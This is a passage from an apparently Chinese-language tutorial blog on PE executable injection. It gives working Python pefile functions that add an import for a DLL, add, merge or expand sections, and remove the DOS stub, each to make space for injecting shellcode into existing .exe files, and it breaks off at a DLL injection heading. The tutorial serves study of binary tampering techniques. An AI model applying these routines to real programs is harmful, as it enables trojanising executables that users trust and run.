punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_IAT<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      new_IAT<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      begin <span class="token operator">+=</span> <span class="token number">8</span>      <span class="token comment"># funcName  </span>    funcName <span class="token operator">=</span> <span class="token string">b'\x00\x00show\x00'</span>      pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>begin<span class="token punctuation">,</span> funcName<span class="token punctuation">)</span>      new_INT<span class="token punctuation">.</span>AddressOfData <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      new_IAT<span class="token punctuation">.</span>AddressOfData <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      begin <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>funcName<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span>      <span class="token comment"># dllName  </span>    dllName <span class="token operator">=</span> <span class="token string">b'Hello.dll\x00'</span>      pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>begin<span class="token punctuation">,</span> dllName<span class="token punctuation">)</span>      new_IDT<span class="token punctuation">.</span>Name <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_IDT<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_INT<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_IAT<span class="token punctuation">)</span>      <span class="token comment"># 更改扩展头中的IDT的地址  </span>    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">=</span> pe<span class="token punctuation">.</span>get_rva_from_offset<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>DATA_DIRECTORY<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Size <span class="token operator">+=</span> <span class="token number">20</span>      <span class="token comment"># 修改节权限  </span>    inject_section <span class="token operator">=</span> <span class="token boolean">None</span>      <span class="token keyword">for</span> section <span class="token keyword">in</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>         <span class="token keyword">if</span> offset <span class="token operator">&lt;=</span> section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> section<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">:</span>            inject_section <span class="token operator">=</span> section            <span class="token keyword">break</span>      inject_section<span class="token punctuation">.</span>Characteristics <span class="token operator">=</span> <span class="token number">0xc0000000</span>      <span class="token comment"># pe.merge_modified_section_data()  </span>    <span class="token comment">#  写入文件  </span>    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_dll.exe'</span><span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-新增节"><a href="#1-4-新增节" class="headerlink" title="1.4 新增节"></a>1.4 新增节</h3><p>如果现有的代码空洞不足以进行注入，那么可以通过更改PE结构来开辟更多的空洞。<br>利用节表和节数据之间的空闲区域再新增一个节，网上有很多详细的讲解，这里就不再赘述。<br>为了不需要移动其他的节数据，一般是在文件末尾新增节。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add_section</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> data_size<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      新增节      :return: offset of new section data      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      data_size <span class="token operator">+=</span> <span class="token number">5</span>      <span class="token comment"># 计算是否足够新增节区头  </span>    begin <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__file_offset__ <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span>      end <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData      cave_size <span class="token operator">=</span> end <span class="token operator">-</span> begin      <span class="token comment"># data_size = len(shellcode) + 5  </span>    <span class="token keyword">if</span> cave_size <span class="token operator">&lt;</span> <span class="token number">80</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] There is not enough cave to add a section header."</span><span class="token punctuation">)</span>         <span class="token keyword">return</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] There are </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cave_size <span class="token operator">-</span> <span class="token number">40</span><span class="token punctuation">&#125;</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cave_size<span class="token punctuation">&#125;</span></span><span class="token string"> - 40) bytes cave to add section header."</span></span><span class="token punctuation">)</span>      <span class="token comment"># 构造新的节表  </span>    new_section <span class="token operator">=</span> SectionStructure<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__IMAGE_SECTION_HEADER_format__<span class="token punctuation">)</span>      new_section<span class="token punctuation">.</span>__unpack__<span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      new_section<span class="token punctuation">.</span>set_file_offset<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>      new_section<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">b'.new'</span>      new_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">=</span> data_size      new_section<span class="token punctuation">.</span>VirtualAddress <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>         pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment      new_section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>         data_size <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment      new_section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData      new_section<span class="token punctuation">.</span>Characteristics <span class="token operator">=</span> <span class="token number">0x60000000</span>      <span class="token comment"># 修改节区数量和我文件大小  </span>    pe<span class="token punctuation">.</span>FILE_HEADER<span class="token punctuation">.</span>NumberOfSections <span class="token operator">+=</span> <span class="token number">1</span>      pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">+</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span>         <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment            <span class="token comment"># 添加节头和节数据  </span>    pe<span class="token punctuation">.</span>__structures__<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_section<span class="token punctuation">)</span>      padding <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> new_section<span class="token punctuation">.</span>SizeOfRawData      <span class="token comment"># pe.__data__ = pe.__data__[:] + padding  </span>    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">,</span> padding<span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] New section added to PE file."</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] FOA: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] RVA: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>new_section<span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>      <span class="token comment"># 写入文件  </span>    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_modified.exe'</span><span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>      <span class="token keyword">return</span> new_section<span class="token punctuation">.</span>PointerToRawData<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="提升NT头"><a href="#提升NT头" class="headerlink" title="提升NT头"></a>提升NT头</h4><p>如果节表和节数据之间的空洞不足以再新增一个节，可以使用此方法将没用的DOS Stub段删除，将其后面的NT头整体上移覆盖掉这段数据，那么节表和节数据之间就可以腾出一些空洞。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lift_header</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      删除 dos_stub, 提升PE头      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      begin <span class="token operator">=</span> pe<span class="token punctuation">.</span>DOS_HEADER<span class="token punctuation">.</span>sizeof<span class="token punctuation">(</span><span class="token punctuation">)</span>      end <span class="token operator">=</span> pe<span class="token punctuation">.</span>NT_HEADERS<span class="token punctuation">.</span>__file_offset__      offset <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData      height <span class="token operator">=</span> end <span class="token operator">-</span> begin      <span class="token keyword">if</span> height <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] No DOS stub to cover!"</span><span class="token punctuation">)</span>         <span class="token keyword">return</span>      <span class="token comment"># 修改DOS头属性  </span>    pe<span class="token punctuation">.</span>DOS_HEADER<span class="token punctuation">.</span>e_lfanew <span class="token operator">-=</span> height      pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>CheckSum <span class="token operator">=</span> pe<span class="token punctuation">.</span>generate_checksum<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment"># 上移头部覆盖dos_stub  </span>    padding <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> height      pe<span class="token punctuation">.</span>__data__ <span class="token operator">=</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span><span class="token punctuation">:</span>begin<span class="token punctuation">]</span> <span class="token operator">+</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>end<span class="token punctuation">:</span>offset<span class="token punctuation">]</span> <span class="token operator">+</span> padding <span class="token operator">+</span> pe<span class="token punctuation">.</span>__data__<span class="token punctuation">[</span>offset<span class="token punctuation">:</span><span class="token punctuation">]</span>      <span class="token comment">#  写入文件  </span>    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_lifted.exe'</span><span class="token punctuation">)</span>      <span class="token comment"># pe.write(modified_filename)  </span>    <span class="token builtin">open</span><span class="token punctuation">(</span>modified_filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__data__<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] File header lifted by </span><span class="token interpolation"><span class="token punctuation">&#123;</span>height<span class="token punctuation">&#125;</span></span><span class="token string"> bytes."</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-5-合并节"><a href="#1-5-合并节" class="headerlink" title="1.5 合并节"></a>1.5 合并节</h3><p>这个方法也是为了新增节，通过合并两个节，节表就会腾出一个位置用来存放新增的节。<br>同样，为了不影响其他节，合并最后两个节是最好的选择。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">merge_sections</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      合并节      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span>sections<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] The section is too little!"</span><span class="token punctuation">)</span>         <span class="token keyword">return</span>      section1 <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>      section2 <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>      name1 <span class="token operator">=</span> section1<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>      name2 <span class="token operator">=</span> section2<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>      virtual_size1 <span class="token operator">=</span> section2<span class="token punctuation">.</span>VirtualAddress <span class="token operator">-</span> section1<span class="token punctuation">.</span>VirtualAddress            data1 <span class="token operator">=</span> section1<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>      data2 <span class="token operator">=</span> section2<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>      padding <span class="token operator">=</span> <span class="token punctuation">(</span>virtual_size1 <span class="token operator">-</span> section1<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">b'\x00'</span>      <span class="token comment"># 修改属性  </span>    pe<span class="token punctuation">.</span>FILE_HEADER<span class="token punctuation">.</span>NumberOfSections <span class="token operator">-=</span> <span class="token number">1</span>      pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>padding<span class="token punctuation">)</span>      <span class="token comment"># 修改节表  </span>    section1<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">=</span> virtual_size1 <span class="token operator">+</span> section2<span class="token punctuation">.</span>Misc_VirtualSize      section1<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">=</span> virtual_size1 <span class="token operator">+</span> section2<span class="token punctuation">.</span>SizeOfRawData      section1<span class="token punctuation">.</span>Characteristics <span class="token operator">|</span><span class="token operator">=</span> section2<span class="token punctuation">.</span>Characteristics      <span class="token comment"># pe.set_bytes_at_offset(section2.__file_offset__, b'\x00' * 40)  </span>    <span class="token comment"># 填充节数据  </span>    <span class="token comment"># begin = section1.PointerToRawData  </span>    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span>section1<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">,</span> data1<span class="token operator">+</span>padding<span class="token operator">+</span>data2<span class="token punctuation">)</span>      <span class="token comment"># pe.__data__ = pe.__data__[:begin] + data1 + padding + data2  </span>    <span class="token comment"># 写入文件  </span>    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_merged.exe'</span><span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] The section </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name2<span class="token punctuation">&#125;</span></span><span class="token string"> has been merged to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name1<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-6-扩展节"><a href="#1-6-扩展节" class="headerlink" title="1.6 扩展节"></a>1.6 扩展节</h3><p>如果不新增节，而现有的代码空洞又不足以注入，可以通过修改节表数据，将现有的节的长度增加。这里实现的是扩展最后一个节。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">expand_section</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> data_size<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token triple-quoted-string string">"""      扩展节（最后一个节）      :return: offset of the expanded part of the last section data      """</span>    pe <span class="token operator">=</span> PE<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>      last_section <span class="token operator">=</span> pe<span class="token punctuation">.</span>sections<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>      data_size <span class="token operator">+=</span> <span class="token number">5</span>      cave_size <span class="token operator">=</span> last_section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">-</span> last_section<span class="token punctuation">.</span>Misc_VirtualSize      <span class="token keyword">if</span> cave_size <span class="token operator">>=</span> data_size<span class="token punctuation">:</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] The cave is enough to use, No section expand."</span><span class="token punctuation">)</span>         <span class="token keyword">return</span>      offset <span class="token operator">=</span> last_section<span class="token punctuation">.</span>PointerToRawData <span class="token operator">+</span> last_section<span class="token punctuation">.</span>Misc_VirtualSize      rva <span class="token operator">=</span> last_section<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> last_section<span class="token punctuation">.</span>Misc_VirtualSize      last_name <span class="token operator">=</span> last_section<span class="token punctuation">.</span>Name<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>      expand_size <span class="token operator">=</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>         <span class="token punctuation">(</span>data_size <span class="token operator">-</span> cave_size<span class="token punctuation">)</span> <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment<span class="token punctuation">)</span> <span class="token operator">*</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>FileAlignment      <span class="token comment"># 修改节区头属性  </span>    last_section<span class="token punctuation">.</span>SizeOfRawData <span class="token operator">+=</span> expand_size      last_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">+=</span> expand_size      last_section<span class="token punctuation">.</span>Characteristics <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x60000000</span>      <span class="token comment"># 计算内存对齐，修改SizeOfImage  </span>    pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SizeOfImage <span class="token operator">+=</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment <span class="token operator">*</span> <span class="token punctuation">(</span>            math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span>last_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span>            <span class="token operator">-</span> math<span class="token punctuation">.</span>ceil<span class="token punctuation">(</span><span class="token punctuation">(</span>last_section<span class="token punctuation">.</span>Misc_VirtualSize <span class="token operator">-</span> expand_size<span class="token punctuation">)</span> <span class="token operator">/</span> pe<span class="token punctuation">.</span>OPTIONAL_HEADER<span class="token punctuation">.</span>SectionAlignment<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 填充节区数据  </span>    padding <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> expand_size      <span class="token comment"># pe.__data__ = pe.__data__[:] + padding  </span>    pe<span class="token punctuation">.</span>set_data_bytes<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span>__data__<span class="token punctuation">)</span><span class="token punctuation">,</span> padding<span class="token punctuation">)</span>      <span class="token comment"># 写入文件  </span>    modified_filename <span class="token operator">=</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.exe'</span><span class="token punctuation">,</span> <span class="token string">'_expanded.exe'</span><span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>write<span class="token punctuation">(</span>modified_filename<span class="token punctuation">)</span>      pe<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] The </span><span class="token interpolation"><span class="token punctuation">&#123;</span>last_name<span class="token punctuation">&#125;</span></span><span class="token string"> section is extended by </span><span class="token interpolation"><span class="token punctuation">&#123;</span>expand_size<span class="token punctuation">&#125;</span></span><span class="token string"> bytes."</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] FOA:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\t[-] RVA:\t</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rva<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">h"</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Modified PE file saved as: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>modified_filename<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>      <span class="token keyword">return</span> offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-DLL注入"><a href="#2-DLL注入" class="headerlink" title="2 DLL注入"></a>2 